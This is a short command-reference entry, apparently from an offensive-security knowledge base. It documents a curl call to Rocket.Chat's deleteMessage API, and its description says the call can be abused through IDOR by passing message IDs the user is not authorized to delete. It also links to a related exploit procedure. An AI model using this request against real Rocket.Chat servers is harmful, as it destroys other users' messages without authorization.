---
data: >-
  curl -X POST -H "X-Auth-Token: YOUR_AUTH_TOKEN" -H "X-User-Id: YOUR_USER_ID"
  -H "Content-Type: application/json"
  https://rocket-chat.example.com/api/v1/method.call -d
  '{"msg":"method","method":"deleteMessage","params":[{"_id":"CZZqd6rMsiqbsqa9h"}],"id":"unique_id_3"}'
tags:
  - api
  - rocket.chat
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:47.383Z'
id: 36086e0e-63de-4ce6-91ea-4e1808ddbf4f
verified: false
validated: true
submitted: true
---
# curl-deletemessage-rocket-chat

## Command

```bash
curl -X POST -H "X-Auth-Token: YOUR_AUTH_TOKEN" -H "X-User-Id: YOUR_USER_ID" -H "Content-Type: application/json" https://rocket-chat.example.com/api/v1/method.call -d '{"msg":"method","method":"deleteMessage","params":[{"_id":"CZZqd6rMsiqbsqa9h"}],"id":"unique_id_3"}'
```

## Description

Deletes a message in Rocket.Chat via API, exploitable for IDOR by using unauthorized message IDs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `_id` in params | Message ID to delete | Yes |

## Examples

### Basic Usage

```bash
curl ... -d '{"msg":"method","method":"deleteMessage","params":[{"_id":"msg123"}],"id":"id3"}'
```

## Expected Output

{"success": true}

## Related

- [[procedures/Exploit-IDOR-to-Modify-and-Send-Delete-Request-in-Rocket.Chat]]
